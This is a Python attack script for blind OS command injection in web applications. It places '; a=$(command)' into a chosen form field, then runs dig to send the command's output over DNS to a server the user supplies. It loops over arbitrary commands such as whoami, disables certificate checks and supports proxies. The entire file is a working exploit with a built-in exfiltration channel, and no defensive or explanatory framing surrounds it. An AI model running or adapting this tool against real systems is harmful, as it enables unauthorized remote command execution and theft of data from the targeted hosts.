import requests
import argparse
import urllib.parse
import urllib3  

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def encode_command(command, server_ip, server_port):
    """
    Encode the command for URL and DNS exfiltration.
    """
    command_part = f"; a=$({command})"
    dns_query = f"dig @{server_ip} -p {server_port} $a"
    # Encode the entire command string
    encoded_command = urllib.parse.quote(command_part + ";" + dns_query)
    return encoded_command

def send_request(url, method, payload, proxy=None):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close'
    }

    verify = False  # Disable SSL certificate verification

    proxies = None
    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy,
        }

    if method.upper() == 'POST':
        response = requests.post(url, data=payload, headers=headers, verify=verify, proxies=proxies)
    elif method.upper() == 'GET':
        response = requests.get(url, params=payload, headers=headers, verify=verify, proxies=proxies)
    else:
        print("Unsupported HTTP method")
        return None

    return response

def prompt_if_missing(args, prompt_name, prompt_text):
    """
    Helper function to prompt for input if not provided in the command line arguments.
    """
    if getattr(args, prompt_name) is None:
        return input(prompt_text)
    return getattr(args, prompt_name)

def main():
    parser = argparse.ArgumentParser(description='Send a request to the vulnerable app with payload.')
    parser.add_argument('--url', type=str, help='The URL of the vulnerable application')
    parser.add_argument('--method', type=str, choices=['GET', 'POST'], help='HTTP method to use (GET or POST)')
    parser.add_argument('--proxy', type=str, help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--server_ip', type=str, help='DNS server IP for exfiltration')
    parser.add_argument('--server_port', type=str, help='DNS server port (e.g., 53 or 8053)', default='53')

    args = parser.parse_args()

    # Prompt for inputs that are not provided as command line arguments
    url = prompt_if_missing(args, 'url', "Enter the URL of the vulnerable application: ")
    method = prompt_if_missing(args, 'method', "Enter the HTTP method (GET or POST): ").upper()
    proxy = prompt_if_missing(args, 'proxy', "Enter the proxy URL (e.g., http://127.0.0.1:8080) or leave blank if not using: ").strip()
    server_ip = prompt_if_missing(args, 'server_ip', "Enter the DNS server IP for exfiltration: ")
    server_port = prompt_if_missing(args, 'server_port', "Enter the DNS server port (e.g., 53 or 8053): ").strip() or "53"

    # Interactive mode to input payload fields
    payload = {}
    target_field = None
    while True:
        field = input("Enter the payload field to specify (e.g., host): ")
        
        if target_field is None:
            use_for_payload = input(f"Do you want to inject the payload into this field '{field}'? (y/n): ").lower()
            if use_for_payload == 'y':
                target_field = field
        
        if field != target_field:
            value = input(f"Enter the value for the field '{field}': ")
            payload[field] = value
        else:
            payload[field] = None  # Initialize with None, command will be added later

        another_field = input("Do you want to add another field? (y/n): ").lower()
        if another_field != 'y':
            break

    while True:
        command = input("Enter the payload command (e.g., whoami, ls /) or press Enter to exit: ")
        if not command:
            print("Exiting...")
            break

        # Encode the command and update the payload with encoded command
        encoded_command = encode_command(command, server_ip, server_port)

        # Manually construct the payload string to avoid double encoding
        payload_with_command = {field: (encoded_command if field == target_field else value) for field, value in payload.items()}
        payload_str = '&'.join(f"{k}={v}" for k, v in payload_with_command.items())

        # Send the request
        response = send_request(url, method, payload_str, proxy)
        
        if response:
            #print("Request URL:", response.url)
            #print("Response Code:", response.status_code)
            #print("Response Text:", response.text)
            pass
        else:
            print("Failed to get a response.")

if __name__ == "__main__":
    main()
